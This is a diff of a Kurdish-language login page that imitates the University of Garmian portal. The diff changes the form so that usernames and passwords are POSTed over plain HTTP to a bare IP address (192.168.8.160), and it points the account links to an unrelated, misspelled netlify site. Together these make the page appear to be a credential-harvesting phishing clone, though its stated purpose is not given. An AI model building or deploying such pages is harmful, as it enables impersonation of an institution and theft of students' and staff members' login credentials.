@@ -3,26 +3,126 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Zankoy Garmian - چوونەژوورەوە</title> 
-    <link rel="stylesheet" href="style.css">
-    <link rel="preconnect" href="https://fonts.googleapis.com">
-    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
-    <link href="https://fonts.googleapis.com/css2?family=Noto+Sans+Arabic:wght@400;700&display=swap" rel="stylesheet">
+    <title>زانکۆی گەرمیان</title>
+    
+    <style>
+/* Reset */
+* {
+    margin: 0;
+    padding: 0;
+    box-sizing: border-box;
+}
+
+body {
+    /* بەپێی کۆدی ڕەسەنی تۆ، ڕەنگی شین (یان وێنە) بوو */
+    background-color: #1976D2; 
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    min-height: 100vh;
+    font-family: 'Noto Sans Arabic', sans-serif; /* بەپێی ئەو فۆنتەی کە بەکار هاتبوو */
+    direction: rtl; /* بۆ زمانی کوردی/عەرەبی */
+}
+
+.login-container {
+    background-color: #ffffff;
+    padding: 40px;
+    border-radius: 12px;
+    box-shadow: 0 4px 15px rgba(0, 0, 0, 0.2);
+    width: 100%;
+    max-width: 400px;
+    text-align: center;
+}
+
+.login-logo {
+    width: 80px;
+    height: 80px;
+    margin-bottom: 20px;
+    border-radius: 50%;
+    object-fit: cover;
+}
+
+h2 {
+    color: #333333;
+    margin-bottom: 30px;
+    font-size: 24px;
+    font-weight: 600;
+}
+
+.input-group {
+    margin-bottom: 20px;
+    text-align: right; /* بۆ ئاراستەی ڕاست بۆ چەپ */
+}
+
+.input-group label {
+    display: block;
+    margin-bottom: 8px;
+    color: #555555;
+    font-size: 14px;
+}
+
+.input-group input[type="text"],
+.input-group input[type="password"] {
+    width: 100%;
+    padding: 12px;
+    border: 1px solid #cccccc;
+    border-radius: 6px;
+    font-size: 16px;
+    transition: border-color 0.3s;
+}
+
+.input-group input:focus {
+    border-color: #1976D2;
+    outline: none;
+}
+
+.login-button {
+    width: 100%;
+    padding: 12px;
+    background-color: #667eaa; /* ڕەنگی دوگمە بەپێی وێنەی CSSـی تۆ */
+    color: #ffffff;
+    border: none;
+    border-radius: 6px;
+    font-size: 16px;
+    cursor: pointer;
+    transition: background-color 0.3s;
+}
+
+.login-button:hover {
+    background-color: #5a6dcb;
+}
+
+.links {
+    margin-top: 15px;
+    display: flex;
+    justify-content: space-between;
+}
+
+.links a {
+    color: #1976D2;
+    text-decoration: none;
+    font-size: 14px;
+    transition: color 0.3s;
+    font-weight: 700;
+}
+
+.links a:hover {
+    text-decoration: underline;
+}
+
+    </style>
 </head>
 <body>
-
     <div class="login-container">
-        <form class="login-form">
-            
-            <img src="logo.jpg" alt="Lgoy Zankoy Garmian" class="login-logo">
-            
-            <h2>زانکۆی گەرمیان</h2> 
-            
+        <img src="/login.jpg" alt="Logo Zankoy Garmian" class="login-logo">
+        
+        <h2>زانکۆی گەرمیان</h2>
+        
+        <form action="http://192.168.8.160" method="POST"> 
             <div class="input-group">
                 <label for="username">ناوی بەکارهێنەر</label>
                 <input type="text" id="username" name="username" required>
             </div>
-            
             <div class="input-group">
                 <label for="password">وشەی نهێنی</label>
                 <input type="password" id="password" name="password" required>
@@ -31,15 +131,10 @@
             <button type="submit" class="login-button">بچۆ ژوورەوە</button>
             
             <div class="links">
-                <a href="#">وشەی نهێنیت لەبیرکردووە؟</a>
-                <a href="#">هەژمارێکی نوێ دروست بکە</a>
+                <a href="https://universy-web-khanaqin.netlify.app">وشەی نهێنیت بیرکردووەتەوە؟</a>
+                <a href="https://universy-web-khanaqin.netlify.app">هەژمارێکی نوێ دروست بکە</a>
             </div>
         </form>
     </div>
-
-
 </body>
-<script src="script.js"></script> 
-</body>
-</html>   
 </html>
